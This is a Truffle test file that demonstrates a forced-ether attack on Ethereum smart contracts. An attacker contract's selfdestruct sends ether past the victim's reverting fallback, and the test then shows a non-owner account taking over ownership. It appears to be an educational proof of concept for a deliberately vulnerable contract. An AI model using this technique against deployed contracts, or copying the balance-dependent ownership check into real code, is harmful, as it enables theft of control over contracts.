var ForceEtherVictim = artifacts.require("./ForceEtherVictim.sol");
var ForceEtherAttacker = artifacts.require("./ForceEtherAttacker.sol");

contract("ForceEther", (accounts) => {

    var victim;
    var attacker;

    it("ForceEther", () => {
        return ForceEtherVictim.deployed().then(instanceVictim => {
            victim = instanceVictim;
            return victim.address;
        }).then((address) => {
            return ForceEtherAttacker.new(address);
        }).then((instanceAttacker) => {
            attacker = instanceAttacker;
        }).then(() => {
            return victim.getOwner.call();
        }).then((owner) => {
            assert.equal(accounts[0], owner);
            return victim.changeOwner({from:accounts[1]});
        }).then(() => {
            return victim.getOwner.call();
        }).then((owner) => {
            // checking that we cannot change the owner
            assert.equal(accounts[0], owner);
            victim.transfer({value: 1, from: accounts[1]});
        }).then(() => {
            assert(false, "VM Exception revert");
        }).catch((error) => {
            return victim.getOwner.call();
        }).then((owner) => {
            // checking that the owner remains the same
            assert.equal(accounts[0], owner);
            // we run the fallback function of the attacker contract
            // if performs selfdestruct and *forces* a transaction to the victim contract
            // and the fallback of the victim contract is not executed (so, revert() is not called)
            // making its balance to be higher than 0
            return web3.eth.sendTransaction({
                from: accounts[0],
                to: attacker.address,
                value: 1
            });
        }).then(() => {
            // now, we can change the owner
            return victim.changeOwner({from: accounts[1]});
        }).then(() => {
            return victim.getOwner.call();
        }).then((owner) => {
            // checking that the owner actually changed
            assert.equal(accounts[1], owner);
        });
    });
});
